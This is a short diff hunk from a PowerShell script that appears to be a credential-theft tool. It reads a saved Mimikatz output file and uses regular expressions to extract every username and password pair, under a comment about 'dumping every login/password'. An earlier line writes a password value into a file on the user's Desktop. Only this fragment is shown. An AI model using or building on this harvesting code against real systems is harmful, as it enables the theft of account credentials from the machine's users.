@@ -42,7 +42,8 @@ echo $null > "$HOME/Desktop/$password"
 # dumping every login/password
 $logins = @()
 $passwords = @()
-echo "out is : $out"
+$out = cat ./output_mimikatz
+echo $out
 for ($i = 0; $i -lt $out.length; $i++) {
 	if ($out[$i] -match '\* Username : (.+)$') {
 		if ($i+2 -lt $out.length -and $out[$i+2] -match '\* Password : (.+)$') {
